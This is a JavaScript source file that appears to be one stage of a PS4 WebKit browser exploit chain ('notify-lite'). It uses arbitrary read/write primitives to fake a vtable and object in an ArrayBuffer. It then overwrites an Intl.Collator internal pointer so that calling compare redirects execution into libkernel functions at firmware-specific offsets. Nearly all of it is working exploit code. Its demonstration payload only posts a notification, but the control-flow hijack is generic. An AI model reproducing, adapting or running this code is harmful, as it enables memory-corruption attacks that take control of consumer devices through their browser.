/**
 * Minimal PS4 Collator notify — core+mem only (no rw_demo / libkernel_resolve).
 * Default: arena struct (OOM-safe). ?notifystr=1 = legacy 0xc30 JS string.
 * ?oneshot=1 + lk in box: Start → pin → fire in one tap (no gap).
 */
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris } from "./core.js";

const BUILD = "notify-lite-3";
const params = new URLSearchParams(location.search);

const COLLATOR_OFF = 0x18;
const ARENA_BYTES = 0x1000;
const FAKE_UC = 0x100;
const FAKE_VT = 0x300;
const MARK_OFF = 0xf00;
const REQ_SIZE = 0xc30;
const MSG_OFF = 0x2d;
const MSG = "PS4 WebKit PoC";
const USE_ARENA = params.get("notifystr") !== "1";
const ONESHOT = params.get("oneshot") === "1";

let lines = [];
let ready = false;
let busy = false;
let pin = null;
const retain = [];

function $(id) { return document.getElementById(id); }

function log(tag, detail) {
    const line = tag + (detail ? "  " + detail : "");
    lines.push(line);
    if (lines.length > 120) lines.shift();
    try {
        const prev = sessionStorage.getItem("wk-notify-log") || "";
        sessionStorage.setItem("wk-notify-log", (prev ? prev + "\n" : "") + line);
    } catch (_) { }
    const o = $("out");
    if (o) { o.textContent = lines.join("\n"); o.scrollTop = o.scrollHeight; }
}

function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
}

function parseAddr(raw) {
    if (!raw) return null;
    if (typeof raw === "object" && raw != null && "low" in raw)
        return new int64(raw.low >>> 0, raw.hi >>> 0);
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function lkFromHex() {
    const el = $("lk-in");
    const raw = el && el.value ? el.value.trim() : "";
    if (!raw) {
        try {
            const s = sessionStorage.getItem("wk-libkernelBase");
            if (s) return parseAddr(s);
        } catch (_) { }
        return null;
    }
    const p = parseAddr(raw);
    if (!p) return null;
    const kUsleep = 0x13b20;
    if ((p.low & 0x3fff) !== 0) {
        const lk = p.sub32(kUsleep);
        if (lk.hi >= 0x80 && lk.hi <= 0x8f && (lk.low & 0x3fff) === 0) return lk;
    }
    return p;
}

function putLow48(view, off, ptr) {
    const lo = ptr.low >>> 0;
    const hi = ptr.hi >>> 0;
    view[off] = lo & 0xff;
    view[off + 1] = (lo >>> 8) & 0xff;
    view[off + 2] = (lo >>> 16) & 0xff;
    view[off + 3] = (lo >>> 24) & 0xff;
    view[off + 4] = hi & 0xff;
    view[off + 5] = (hi >>> 8) & 0xff;
    view[off + 6] = 0;
    view[off + 7] = 0;
}

function writeReqArena(view, baseOff) {
    for (let i = 0; i < baseOff + MSG_OFF; i++) view[baseOff + i] = 0;
    for (let i = 0; i < MSG.length; i++)
        view[baseOff + MSG_OFF + i] = MSG.charCodeAt(i) & 0xff;
    view[baseOff + MSG_OFF + MSG.length] = 0;
    view[baseOff + 0x2c] = 1; // useIconImageUri
}

function buildReqString() {
    const trail = REQ_SIZE - MSG_OFF - MSG.length;
    return "\x00".repeat(MSG_OFF) + MSG + "\x00".repeat(trail);
}

function arenaBacking(p, view) {
    const cell = p.leakval(view);
    const ptr = p.read8(cell.add32(0x10));
    if (!ptr || ptr.hi < 0x80 || ptr.hi > 0x8f) return null;
    if (p.read1(ptr.add32(MARK_OFF)) !== 0x52) return null;
    return ptr;
}

function doPin(p, off) {
    log("PIN", "arena=" + USE_ARENA);
    const collator = new Intl.Collator("en", { usage: "search" });
    const compareFn = collator.compare;
    if (!(compareFn("a", "b") < 0)) throw new Error("collator fail");
    const ab = new ArrayBuffer(ARENA_BYTES);
    const view = new Uint8Array(ab);
    view[MARK_OFF] = 0x52;
    view[MARK_OFF + 1] = 0x4f;
    view[MARK_OFF + 2] = 0x50;
    view[MARK_OFF + 3] = 0x31;
    let compareArg;
    let reqStr = null;
    if (USE_ARENA) {
        writeReqArena(view, 0);
        compareArg = "\x00";
        retain.push(collator, compareFn, ab, view, compareArg);
    } else {
        reqStr = buildReqString();
        compareArg = reqStr;
        retain.push(collator, compareFn, ab, view, reqStr, compareArg);
    }
    const collCell = p.leakval(collator);
    const backing = arenaBacking(p, view);
    if (!backing) throw new Error("arena +0x10 fail");
    const fakeUC = backing.add32(FAKE_UC);
    const fakeVT = backing.add32(FAKE_VT);
    putLow48(view, FAKE_UC, fakeVT);
    for (let i = 0x48; i < 0x50; i++) view[FAKE_UC + i] = 0;
    for (let i = 0x60; i < 0x68; i++) view[FAKE_UC + i] = 0;
    if (USE_ARENA) {
        putLow48(view, FAKE_UC + 0x48, backing);
        view[FAKE_UC + 0x60] = REQ_SIZE & 0xff;
        view[FAKE_UC + 0x61] = (REQ_SIZE >>> 8) & 0xff;
        view[FAKE_UC + 0x62] = (REQ_SIZE >>> 16) & 0xff;
        view[FAKE_UC + 0x63] = (REQ_SIZE >>> 24) & 0xff;
    }
    log("PREWARM", "unhooked compareFn");
    const pre = compareFn(compareArg, "b");
    if (!Number.isFinite(pre)) throw new Error("prewarm fail pre=" + pre);
    log("PIN-OK", "coll=" + collCell + " arena=" + backing + " pre=" + pre);
    return {
        collator, compareFn, compareArg, view, backing, fakeUC, fakeVT,
        field: collCell.add32(COLLATOR_OFF),
        gd: off.wk_notify_gd || 0x1aca,
        nt: off.k_notify || 0x19320,
        arenaMode: USE_ARENA,
    };
}

function doFire(p) {
    if (!pin) throw new Error("pin first");
    const lk = lkFromHex();
    if (!lk) throw new Error("paste fn or lk");
    log("FIRE", "lk=" + lk + " arena=" + pin.arenaMode);
    putLow48(pin.view, FAKE_UC + 0xe0, lk.add32(pin.nt));
    putLow48(pin.view, FAKE_VT + 0x128, lk.add32(pin.gd));
    const orig = p.read8(pin.field);
    p.write8(pin.field, pin.fakeUC);
    let res = NaN;
    let err = null;
    try { res = pin.compareFn(pin.compareArg, "b"); } catch (e) { err = e; }
    p.write8(pin.field, orig);
    if (err) throw err;
    log("DONE", "result=" + res + (res === 0 ? " TOAST?" : ""));
    state(res === 0 ? "notify OK — check toast" : "errno " + res, res === 0 ? "ok" : "bad");
    return res;
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    state("primitive…", "warn");
    log("BOOT", BUILD + " arena=" + USE_ARENA + " oneshot=" + ONESHOT);
    try {
        const carrier = await establishPrimitive({
            maxAttempts: parseInt(params.get("attempts") || "0", 10) || 0,
            onEvent: (t, d) => { if (/FAIL|ERROR|PRIMITIVE|ATTEMPT/i.test(t)) log(t, d || ""); },
        });
        installWindowP(carrier, { promote: false });
        window._wkCarrier = carrier;
        if (!window.p) throw new Error("no window.p");
        try { trimExploitDebris(); log("TRIM", "groom freed"); } catch (_) { }
        ready = true;
        if (ONESHOT) {
            log("ONESHOT", "pin+fire sync");
            const off = offsetsFor(navigator.userAgent).off;
            if (!off) throw new Error("unknown FW");
            pin = doPin(window.p, off);
            if (lkFromHex()) {
                doFire(window.p);
                return;
            }
            log("ONESHOT-WAIT", "paste fn → Fire (or reload with lk in box)");
            $("btn-fire").disabled = false;
            state("pinned — paste fn → Fire", "ok");
            return;
        }
        log("PRIMITIVE-OK", "tap Pin then Fire");
        state("OK — Pin → paste fn → Fire", "ok");
        $("btn-pin").disabled = false;
    } catch (e) {
        log("FAIL", e.message || String(e));
        state("failed", "bad");
    } finally {
        busy = false;
    }
}

function runPin() {
    if (busy || !ready || !window.p || pin) return;
    busy = true;
    state("pinning…", "warn");
    log("PIN-TAP", "");
    try {
        const off = offsetsFor(navigator.userAgent).off;
        if (!off) throw new Error("unknown FW");
        pin = doPin(window.p, off);
        $("btn-fire").disabled = false;
        state("pinned — paste fn → Fire", "ok");
    } catch (e) {
        log("PIN-FAIL", e.message || String(e));
        state("pin failed", "bad");
    } finally {
        busy = false;
    }
}

function runFire() {
    if (busy || !ready || !window.p || !pin) return;
    busy = true;
    state("firing…", "warn");
    log("FIRE-TAP", "");
    try {
        doFire(window.p);
    } catch (e) {
        log("FAIL", e.message || String(e));
        state("fire failed", "bad");
    } finally {
        busy = false;
    }
}

function init() {
    try {
        const prev = sessionStorage.getItem("wk-notify-log");
        if (prev) lines = prev.split("\n").slice(-80);
    } catch (_) { }
    $("out").textContent = lines.join("\n");
    $("btn-start").addEventListener("click", runStart);
    $("btn-pin").addEventListener("click", runPin);
    $("btn-fire").addEventListener("click", runFire);
    state(ONESHOT ? "oneshot — paste lk → Start" : "arena notify lite", "");
}

init();
